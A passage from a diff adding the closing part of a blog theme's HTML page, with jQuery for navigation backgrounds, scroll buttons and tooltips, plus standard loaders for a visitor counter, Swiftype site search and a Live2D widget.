+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript">
+      window.onload = function(){
+        document.getElementById("search").onclick = function(){
+            console.log("search")
+            search();
+        }
+      }
+      function search(){
+        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
+      }
+    </script>
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
